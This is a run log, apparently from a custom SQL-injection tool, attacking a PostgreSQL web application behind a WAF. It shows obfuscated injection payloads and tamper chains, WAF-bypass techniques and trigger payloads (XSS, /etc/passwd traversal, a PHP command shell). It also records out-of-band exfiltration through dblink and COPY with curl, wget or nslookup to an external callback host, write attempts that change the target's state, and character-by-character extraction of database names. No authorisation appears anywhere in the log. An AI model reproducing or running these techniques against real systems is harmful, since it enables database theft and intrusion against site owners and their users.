+[!] [Extract] Timing fallback oracle FAILED validation: true/false probes both returned False — CDN caching or very low timing margin; BatchExtract with this oracle would produce garbage. Aborting timing-based extraction.
+[!] [_extract_str] No oracle available for SQL: 'SELECT "email" FROM "main"."□" LIMIT 1 OFFSET 0' (ConditionalErrorOracle not calibrated, MSE not wired, timing fallback N/A). Extraction will return empty string.
+[!] [Extract] No oracle available for 'SELECT "email" FROM "main"."□" LIMIT 1 O...'
+    → extraction impossible (error oracle + boolean oracle + timing fallback all failed).
+    → Check oracle calibration and detection technique.
+[!] Could not find columns for □  specify --columns
+[+] [MSE] Standard extraction failed  trying MultiStrategyExtractor...
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=1247ms)...
+[MSE]   untampered: || CASE WHEN ARRAY_LOWER(ARRAY[1E0,2E0,3E0],1E0)!~~LN(2.718)...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]  [Boolean] SimHash similarity also insufficient (sim=1.000) — no body oracle available
+[MSE]   err(div0): err400/49B ok400/49B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/5 oracles available: []
+[+] --- Auto-extraction complete ---
+[*] Extraction completed for 'country'
+[*] Skipping 2 deferred extraction(s)  extraction already ran for []
+[!] [PY313-RECOVERY] Extraction did not run (Python 3.13 recursive Task.cancel) — restarting
+[*] Using forced DBMS: PostgreSQL (--dbms flag)
+[+] DBMS: PostgreSQL  (conf=100%)
+[*] [MultiVector] Probing extraction methods for PostgreSQL...
+[+] [MultiVector] Available methods (fastestslowest): boolean(blind), timing(blind)
+[+] --- Auto-extraction starting ---
+[+] [Inference] Detection payload: Fr/*6x*//*No*/|/*Y9%5A*/|  c%61%53%45/*%74o*//*i%4E*/W%68EN   %61rrAy_l
+[+] [Inference] DBMS: PostgreSQL | Tamper chain: ['space2multicomment', 'case_variation_extended', 'paramfragment', 'percentencode_selective', 'overlong_utf8', 'pg_dollar_quote', 'hex_entities', 'json_unicode_escape']
+[+] [Inference] Template (boolean-append): Fr/*6x*//*No*/|/*Y9%5A*/|  c%61%53%45/*%74o*//*i%4E*/W%68EN   %61rrAy_lOWe%72(a%5
+[+] [Inference] No sleep value in detection payload — falling back to 0.5s
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cooling down 5s before calibration...
+[+] [Inference] Calibrating with detection template (delay=0.5s)...
+[+] [Inference] CDN-cached response (207ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] CDN retry also fast (215ms) — origin is fast, disabling CDN wait for remaining probes
+[+] [Inference] Calibration 1: TRUE=250ms FALSE=215ms margin=35ms
+[+] [Inference] Best margin: 35ms
+[+] [Inference] Body length differs but too small (402B = 72.2% on 557B page)  dynamic noise, not oracle
+[+] [Inference] Boolean oracle not detected after 3 attempts
+[+] [Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...
+[+] [Inference] Wasserstein mean=0.006 n=12 (threshold=0.25)
+[+] [Inference]  Threshold=233ms (margin=35ms)
+[!] [Inference] Timing oracle UNRELIABLE: margin=35ms < min=400ms (CDN noise exceeds injection signal — timing extraction skipped)
+[!] [Inference] BUG-V214-A FIX: all standard oracles failed for non-timing technique 'ST' — attempting baseline-similarity oracle (CTX-bool style)
+[!] [Inference] Baseline-similarity oracle: sim_t=0.500 sim_f=0.500 gap=0.000
+[+] [Inference] No boolean oracle and timing unreliable  aborting extraction (re-run with longer sleep e.g. --time-sec 2 or wait for CDN cache expiry)
+[+] [Inference] No data extracted  trying side channels
+[+] [SchemaEnumV18] Inference returned no DB name — activating SchemaEnumeratorV18 enhanced enumerator
+[+] [SideChannel] DNS OOB extraction  aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [SideChannel] Advanced DNS: dblink
+[+] [SideChannel] Advanced DNS: copy_nslookup
+[+] [SideChannel] Advanced DNS: copy_curl
+[+] [SideChannel] HTTP exfil: copy_curl
+[+] [SideChannel] HTTP exfil: copy_wget
+[SideChannel] Probing WHERE-ERROR (4 strategies)...
+[SideChannel]   arith_nowhere: err_len=557 ok_len=155 (length diff 72.2% )
+[SideChannel]  arith_nowhere VALIDATED (signal=length, real: 400/557B vs 400/155B)
+[+] [SideChannel]  WHERE-ERROR available  using for extraction
+[+] [Novel]  Starting 7 novel WAF bypass extraction techniques 
+[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)
+[+] [Novel-1] Sending clean baseline probe...
+[+] [Novel-1] Testing WAF trigger 1/7: <script>alert(1)</script>...
+[+] [Novel-1] Testing WAF trigger 2/7: ../../../../../../etc/passwd...
+[+] [Novel-1] Testing WAF trigger 3/7: <img src=x onerror=alert(1)>...
+[+] [Novel-1] Testing WAF trigger 4/7: javascript:alert(1)...
+[+] [Novel-1] Testing WAF trigger 5/7: UNION SELECT FROM...
+[+] [Novel-1] Testing WAF trigger 6/7: <?php system($_GET['c']); ?>...
+[+] [Novel-1] Testing WAF trigger 7/7: ${7*7}...
+[+] [Novel]  No WAF trigger produced different response
+[+] [Novel] Technique 2: Micro-timing (statistical sub-threshold delays)
+[+] [Novel-2] Micro-timing sample 1/10...
+[+] [Novel-2] Micro-timing sample 6/10...
+[+] [Novel]  Micro-timing not viable (noise too high)
+[+] [Novel] Technique 3: Resource bomb (asymmetric computation)
+[+] [Novel]  Resource bomb not viable (margin=-27ms)
+[+] [Novel] Technique 4: Alternative DNS exfil vectors
+[+] [Novel] DNS vector 'dblink_connect' fired for user  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for user  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for user  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for user  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for database  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for database  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for database  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for database  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for version  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for version  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for version  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for version  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] Technique 4: polling OAST for DNS callbacks (30s)...
+[+] [Novel] Technique 5: Connection pool exhaustion oracle
+[+] [Novel] Connection exhaustion test: status after lock = 400
+[+] [Novel] Technique 6: Write-then-read (two-stage)
+[+] [Novel]  Write-then-read response: <html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></cente
+[+] [Novel] Technique 7: Response splitting via config/session vars
+[+] [Novel] Technique 8: Conditional error type oracle
+[+] [Novel]  No error type produces different response
+[+] [Novel] Technique 9: Prepared statement keyword bypass
+[+] [Novel] Prepared statements sent for database
+[+] [Novel] Prepared statements sent for version
+[+] [Novel] Technique 10: Application state mutation
+[+] [Novel] State mutation 'table_write' sent for user
+[+] [Novel] State mutation 'comment_inject' sent for user
+[+] [Novel] State mutation 'sequence_name' sent for user
+[+] [Novel] State mutation 'table_write' sent for database
+[+] [Novel] State mutation 'comment_inject' sent for database
+[+] [Novel] State mutation 'sequence_name' sent for database
+[+] [Novel] State mutation 'table_write' sent for version
+[+] [Novel] State mutation 'comment_inject' sent for version
+[+] [Novel] State mutation 'sequence_name' sent for version
+[+] [Novel] Technique 11: TCP/response size inflation
+[+] [Novel]  TCP inflation not viable (WAF blocked: inflated_sc=400 normal_sc=400)
+[+] [Novel] Technique 12: Nested/multi-layer encoding bypass
+[+] [Novel] Technique 13: Conditional redirect detection
+[+] [Novel]  No redirect differentiation
+[+] [Novel] Technique 14: Cache key manipulation
+[+] [Novel]  Cache oracle not viable (margin=-58ms)
+[+] [Novel] Technique 15: CHR() keyword bypass
+[+] [Novel] CHR() bypass sent for version
+[+] [SideChannel]  Extracting via side channels 
+[SideChannel] DNS OOB: version()  aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=400 (217ms) (WAF-blocked)
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=400 (227ms) (WAF-blocked)
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=400 (292ms) (WAF-blocked)
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=400 (227ms) (WAF-blocked)
+[SideChannel]  All OOB methods returned error/blocked status codes — polling anyway (DNS resolves before TCP; callbacks may exist)
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.aitlttgserrmsjibhyvo21byfocux597j.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Extracting: version() via arith_nowhere (signal=length)
+[SideChannel] Oracle sanity primary FAILED (1>0→False, 1>2→False) — retrying with real comparison conditions
+[SideChannel] Oracle sanity FAILED (primary: 1>0→False, 1>2→False; retry: current_user>='!'→False, current_user>='zzzzz'→False) — aborting extraction for: version()
+[+] [SideChannel] WHERE-ERROR validated  extracting db/user via binary search
+[SideChannel] DNS OOB: current_catalog  aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=400 (199ms) (WAF-blocked)
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=400 (236ms) (WAF-blocked)
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=400 (224ms) (WAF-blocked)
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=400 (218ms) (WAF-blocked)
+[SideChannel]  All OOB methods returned error/blocked status codes — polling anyway (DNS resolves before TCP; callbacks may exist)
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.aitlttgserrmsjibhyvo21byfocux597j.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Extracting: current_catalog via arith_nowhere (signal=length)
+[SideChannel] Oracle sanity primary FAILED (1>0→False, 1>2→False) — retrying with real comparison conditions
+[SideChannel] Oracle sanity RETRY OK (current_user>='!'→True, current_user>='zzzzz'→False) — proceeding with extraction
+[SideChannel] pos=1  '\U0004d87a'  result='\U0004d87a'  [51 reqs]
+[SideChannel] pos=2  '('  result='\U0004d87a('  [59 reqs]
+[SideChannel] pos=3  '\U000bade7'  result='\U0004d87a(\U000bade7'  [81 reqs]
+[SideChannel] DNS OOB: current_user  aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=400 (253ms) (WAF-blocked)
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=400 (198ms) (WAF-blocked)
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=400 (225ms) (WAF-blocked)
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=400 (239ms) (WAF-blocked)
+[SideChannel]  All OOB methods returned error/blocked status codes — polling anyway (DNS resolves before TCP; callbacks may exist)
+[SideChannel] Polling callback server for DNS interactions (45s)...
+^C^CTraceback (most recent call last):
+  File "/home/kali/Desktop/sqlreaper_v214.py", line 173914, in <module>
+    _main_thread.join()
+    ~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/threading.py", line 1094, in join
+    self._handle.join(timeout)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^
+KeyboardInterrupt
+^CTraceback (most recent call last):
+  File "/usr/lib/python3.13/threading.py", line 1542, in _shutdown
+    _thread_shutdown()
+KeyboardInterrupt: 
